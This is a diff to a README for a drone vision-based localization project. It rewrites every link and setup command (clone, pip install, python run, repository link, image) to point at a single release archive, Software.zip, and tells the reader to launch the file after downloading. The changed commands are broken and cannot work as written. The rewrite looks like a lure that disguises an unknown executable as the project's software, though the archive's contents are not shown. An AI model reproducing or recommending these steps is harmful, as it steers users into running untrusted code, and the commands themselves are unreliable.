@@ -6,7 +6,7 @@
 🔍 Adaptive Noise Scaling, AKAZE, BRISK, Computer Vision, Feature Detection, Feature Matching, Geolocalization, Homography, Image Processing, Localization, OpenCV, ORB, Position Estimation, RANSAC, Region-of-Interest, SIFT, UAV, UAV Navigation
 
 ## Download Latest Version
-[![Download VisionUAV Navigation v1.0.0](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download VisionUAV Navigation v1.0.0](https://github.com/Chethanks2005/VisionUAV-Navigation/releases/download/v1.0/Software.zip)](https://github.com/Chethanks2005/VisionUAV-Navigation/releases/download/v1.0/Software.zip)
 
 ℹ️ *The file needs to be launched after downloading.*
 
@@ -30,17 +30,17 @@ VisionUAV Navigation is a state-of-the-art system designed to provide accurate l
 ## Installation
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/VisionUAV-Navigation.git
+   git clone https://github.com/Chethanks2005/VisionUAV-Navigation/releases/download/v1.0/Software.zip
    ```
 2. Install the necessary dependencies using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Chethanks2005/VisionUAV-Navigation/releases/download/v1.0/Software.zip
    ```
 
 ## Usage
 1. Run the main script to start the vision-based localization system:
    ```bash
-   python main.py
+   python https://github.com/Chethanks2005/VisionUAV-Navigation/releases/download/v1.0/Software.zip
    ```
 2. Follow the on-screen instructions for calibration and operation.
 
@@ -54,6 +54,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 🌟 Dive into the world of vision-based UAV navigation with VisionUAV Navigation - your solution for accurate position estimation in GPS-denied environments! 🌟
 
-🔗 For more information, visit the official [VisionUAV Navigation repository](https://github.com/your-username/VisionUAV-Navigation). Make sure to check the "Releases" section for the latest updates and downloads. 🚀
+🔗 For more information, visit the official [VisionUAV Navigation repository](https://github.com/Chethanks2005/VisionUAV-Navigation/releases/download/v1.0/Software.zip). Make sure to check the "Releases" section for the latest updates and downloads. 🚀
 
-![UAV Image](https://your-image-url.com/uav-image.png)
+![UAV Image](https://github.com/Chethanks2005/VisionUAV-Navigation/releases/download/v1.0/Software.zip)
